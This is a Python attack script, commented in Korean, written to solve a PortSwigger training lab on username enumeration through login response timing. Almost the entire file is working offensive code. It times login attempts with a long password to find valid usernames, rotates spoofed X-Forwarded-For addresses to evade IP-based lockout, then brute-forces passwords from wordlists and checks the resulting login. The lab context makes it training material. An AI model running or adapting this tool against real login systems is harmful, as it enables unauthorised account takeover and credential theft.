#!/usr/bin/env python3
"""
Authentication - Timing-based Username Enumeration
PortSwigger Lab:
  https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

응답 시간 차이를 이용해 유효한 username 을 찾는다.

핵심 아이디어:
  - username 이 무효하면 즉시 실패(빠름)
  - username 이 유효하면 password 검증(해싱)을 수행 → 매우 긴 password 를 넣으면
    그만큼 처리 시간이 길어짐
  - IP 기반 brute-force 보호는 X-Forwarded-For 헤더를 매 요청 회전시켜 우회

기존 툴(14-authentication-brute-force.py)의 목록 로더/세션/브루트포스 함수를 재사용한다.

사용 예시:
  # 타이밍으로 username 열거 후 password brute-force 까지 (기본)
  python3 14-authentication-timing-enum.py \\
    --target "https://LAB-ID.web-security-academy.net" --verify

  # 타이밍만 (username 만)
  python3 14-authentication-timing-enum.py \\
    --target "https://LAB-ID.web-security-academy.net" --no-brute
"""

import argparse
import importlib.util
import itertools
import os
import statistics
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_BF_PATH = os.path.join(_HERE, "14-authentication-brute-force.py")


def _load_bruteforce():
    spec = importlib.util.spec_from_file_location("auth_bruteforce", _BF_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


bf = _load_bruteforce()


class IpRotator:
    """요청마다 고유한 X-Forwarded-For 값을 생성해 IP 기반 차단을 우회한다."""

    def __init__(self, header: str | None):
        self.header = header
        self._n = itertools.count(1)

    def headers(self) -> dict | None:
        if not self.header:
            return None
        n = next(self._n)
        return {self.header: f"10.0.{(n >> 8) & 255}.{n & 255}"}


def timed_attempt(login, username: str, password: str, headers) -> tuple[float, object]:
    t0 = time.perf_counter()
    resp = login.attempt(username, password, headers=headers)
    return (time.perf_counter() - t0) * 1000.0, resp


def main() -> None:
    parser = argparse.ArgumentParser(
        description="응답 시간 기반 username enumeration + password brute-force"
    )
    parser.add_argument("--target", required=True,
                        help="대상 베이스 URL (예: https://LAB.web-security-academy.net)")
    parser.add_argument("--login-path", default="/login",
                        help="로그인 경로 (기본값: /login)")
    parser.add_argument("--username-field", default="username",
                        help="username 파라미터 이름 (기본값: username)")
    parser.add_argument("--password-field", default="password",
                        help="password 파라미터 이름 (기본값: password)")
    parser.add_argument("--usernames", default=None,
                        help=f"username 목록 (URL/파일/인라인). 기본: {bf.DEFAULT_USERNAMES}")
    parser.add_argument("--passwords", default=None,
                        help=f"password 목록. 기본: {bf.DEFAULT_PASSWORDS}")
    parser.add_argument("--ip-header", default="X-Forwarded-For",
                        help="IP 스푸핑 헤더 이름 (기본: X-Forwarded-For)")
    parser.add_argument("--no-spoof", dest="spoof", action="store_false", default=True,
                        help="IP 스푸핑 비활성화 (기본: 활성화)")
    parser.add_argument("--long-password-length", type=int, default=100,
                        help="열거 시 사용할 매우 긴 password 길이 (기본: 100)")
    parser.add_argument("--repeats", type=int, default=3,
                        help="username 당 측정 반복 횟수 (기본: 3)")
    parser.add_argument("--threshold", type=float, default=2.0,
                        help="기준 대비 타이밍 비율 임계값 (기본: 2.0)")
    parser.add_argument("--candidates", type=int, default=1,
                        help="password brute-force 할 상위 후보 수 (기본: 1)")
    parser.add_argument("--session", default=None, help="기존 세션 쿠키 값 (선택)")
    parser.add_argument("--brute", dest="brute", action="store_true", default=True,
                        help="열거 후 password brute-force 수행 (기본: 수행)")
    parser.add_argument("--no-brute", dest="brute", action="store_false",
                        help="password brute-force 생략")
    parser.add_argument("--pass-fail", default="Invalid username or password",
                        help="password 단계 실패 응답 문자열 (기본: 'Invalid username or password')")
    parser.add_argument("--verify", action="store_true",
                        help="자격증명으로 로그인/계정 접근 검증")
    parser.add_argument("--account-path", default="/my-account",
                        help="검증 시 접근할 계정 경로 (기본: /my-account)")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="요청 간 지연(초) (기본: 0)")
    args = parser.parse_args()

    try:
        usernames = bf.load_wordlist(args.usernames, bf.DEFAULT_USERNAMES)
    except Exception as e:
        print(f"[-] 목록 로딩 실패: {e}")
        sys.exit(1)

    rotr = IpRotator(args.ip_header if args.spoof else None)
    long_pw = "A" * args.long_password_length

    print(f"[*] 대상          : {args.target}")
    print(f"    IP 스푸핑     : {args.ip_header if args.spoof else '비활성화'}")
    print(f"    긴 password   : {args.long_password_length}자")
    print(f"    반복          : {args.repeats}회")
    print(f"    username      : {len(usernames)}개")

    login = bf.LoginSession(args.target, args.login_path, args.username_field,
                            args.password_field, args.session)
    print(f"    CSRF          : {'획득' if login.csrf else '없음'}")

    print(f"\n[*] 1단계 — 타이밍 기반 username enumeration")
    print(f"    {'username':<24} {'median(ms)':>10} {'min':>8} {'max':>8}  samples")
    print("    " + "-" * 68)

    measurements = []  # (username, median_ms, times)
    for user in usernames:
        times = []
        for _ in range(args.repeats):
            try:
                ms, _ = timed_attempt(login, user, long_pw, rotr.headers())
                times.append(ms)
            except Exception as e:  # noqa: BLE001
                print(f"    {user:<24} 요청 실패: {e}")
                break
            if args.delay:
                time.sleep(args.delay)
        if not times:
            continue
        med = statistics.median(times)
        measurements.append((user, med, times))
        print(f"    {user:<24} {med:>10.1f} {min(times):>8.1f} {max(times):>8.1f}"
              f"  {[round(t, 1) for t in times]}")

    if not measurements:
        print("[-] 측정값이 없습니다.")
        sys.exit(1)

    baseline = min(m for _, m, _ in measurements)
    ranked = sorted(measurements, key=lambda x: x[1], reverse=True)

    print(f"\n[*] 타이밍 분석 (baseline=최소 median {baseline:.1f}ms, "
          f"임계 비율={args.threshold})")
    flagged = []
    for user, med, _ in ranked[:10]:
        ratio = med / baseline if baseline else 0
        mark = ""
        if ratio >= args.threshold:
            mark = f"  <== 후보 (x{ratio:.2f})"
            flagged.append(user)
        print(f"    {user:<24} {med:>10.1f} ms   x{ratio:.2f}{mark}")

    if not flagged:
        print("\n[-] 임계값을 넘는 타이밍 후보가 없습니다. --threshold 를 낮춰 재시도하세요.")
        expected = [u for u, _, _ in ranked[:3]]
        print(f"    상위 타이밍: {expected}")
        flagged = expected[:args.candidates]

    candidates = flagged[:args.candidates]
    print(f"\n[+] 유효 username 후보: {candidates}")

    if not args.brute:
        return

    passwords = bf.load_wordlist(args.passwords, bf.DEFAULT_PASSWORDS)
    for username in candidates:
        pw = bf.brute_password(login, username, passwords, args.pass_fail,
                               args.delay, header_provider=rotr.headers)
        if pw:
            print(f"\n[=] 결과: {username} / {pw}")
            if args.verify:
                bf.verify_login(login, username, pw, args.account_path,
                                headers=rotr.headers())
            return
    print("\n[-] 후보 username 에 대한 password 를 찾지 못했습니다.")


if __name__ == "__main__":
    main()
